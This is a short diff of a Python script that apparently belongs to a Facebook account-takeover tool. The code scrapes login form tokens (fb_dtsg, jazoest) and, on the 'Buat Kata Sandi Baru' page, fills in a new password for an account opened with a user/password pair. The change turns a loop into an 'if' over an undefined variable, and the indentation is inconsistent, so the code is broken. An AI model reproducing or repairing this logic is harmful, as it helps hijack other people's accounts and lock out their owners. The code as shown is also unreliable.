@@ -645,7 +645,7 @@ class log_hasil(user, pasw):
         link3=resUbah.find("form",{"method":"post"})
         but2=["submit[Next]","nh","fb_dtsg","jazoest"]
       if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
-      for b in resUbah("input"):
+      if b in resUbah("input"):
         if b.get("name") in but2:
           dat2.update({b.get("name"):b.get("value")})
           dat2.update({"password_new":"".join(pwBaru)})
